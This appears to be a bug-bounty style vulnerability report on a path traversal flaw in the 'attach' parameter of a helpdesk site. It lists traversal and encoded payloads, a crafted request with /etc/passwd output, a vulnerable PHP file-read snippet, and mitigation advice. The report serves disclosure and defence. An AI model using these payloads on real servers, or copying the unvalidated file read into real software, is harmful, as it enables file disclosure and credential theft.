# Local File Inclusion (LFI) / Path Traversal - Helpdesk

## Summary

I identified a Local File Inclusion (LFI) / Path Traversal vulnerability in the `attach` parameter of the application's helpdesk functionality.

The application accepts user-controlled input through the `attach` parameter and uses it to read files from the server without proper validation or sanitization. By injecting path traversal sequences (`../`), an attacker can read sensitive files outside the intended directory, including system configuration files like `/etc/passwd`.

An attacker can craft a malicious URL that reads arbitrary files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**Local File Inclusion (LFI) / Path Traversal**

## Vulnerable Parameters

```text
tab
attach
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/helpdesk/?tab=attachments&attach=5
```

## Steps to Reproduce

1. Navigate to the vulnerable helpdesk page at `https://kzlabs.in/subdomains/helpdesk/`.

2. Replace the value of the `attach` parameter with a path traversal payload:

   ```text
   ../../../../../../../../etc/passwd
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/subdomains/helpdesk/?tab=attachments&attach=../../../../../../../../etc/passwd
   ```

4. Observe that the application reads and displays the contents of `/etc/passwd` in the response.

5. The output reveals system user accounts, including the `root` user.

## Payloads Used

```text
/etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//....//....//....//etc/passwd
```

URL-encoded versions:
```text
%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
<img width="1905" height="1028" alt="Screenshot 2026-09-10 193613" src="https://github.com/user-attachments/assets/208eb31c-2b51-4f26-9028-9d7c62df6971" />
<img width="1890" height="1025" alt="Screenshot 2026-09-10 193631" src="https://github.com/user-attachments/assets/39d64c11-0f0c-4504-a068-0fa656f448a9" />

## Proof of Concept

The application takes the `attach` parameter and uses it to read a file without validation:

```php
<?php
$attach = $_GET['attach'];
echo file_get_contents($attach);
?>
```

The request:

```http
GET /subdomains/helpdesk/?tab=attachments&attach=../../../../../../../../etc/passwd HTTP/2
Host: kzlabs.in
Cookie: PHPSESSID=04sv3msp8c0c4agrr7flkesno2
```

Response:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
...
```

The file content is rendered inside a `<div class="attach-viewer">` element, confirming the LFI.

## Impact

An attacker can:

- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, `/etc/hosts`)
- Read application configuration files (database credentials, API keys)
- Read application source code
- Extract sensitive user data
- Enumerate system users and services
- Potentially achieve Remote Code Execution (RCE) by reading log files or combining with other vulnerabilities
- Bypass authentication by reading session files or configuration

## Recommendation

To mitigate this vulnerability:

- **Avoid User-Controlled Paths**: Do not use user input directly to determine file paths.

- **Use a Whitelist**: Only allow specific, pre-approved attachments to be accessed.
  ```php
  $allowed_attachments = [1, 2, 3, 4, 5];
  $attach = (int)$_GET['attach'];
  if (!in_array($attach, $allowed_attachments)) {
      die("Attachment not allowed.");
  }
  $path = "/var/www/helpdesk/attachments/" . $attach;
  ```

- **Validate Input**: Ensure the input is numeric if the parameter expects an ID.
  ```php
  $attach = (int)$_GET['attach'];
  $path = "/var/www/helpdesk/attachments/" . $attach;
  ```

- **Use Realpath**: Resolve the real path and verify it's within the intended directory.
  ```php
  $base_dir = '/var/www/helpdesk/attachments/';
  $real_path = realpath($base_dir . $_GET['attach']);
  if (strpos($real_path, $base_dir) !== 0) {
      die("Invalid file path.");
  }
  ```

- **Disable `allow_url_include`**: Prevent remote file inclusion in `php.ini`.
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

- **Chroot Jail**: Restrict the web server to a specific directory.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block path traversal payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.

---
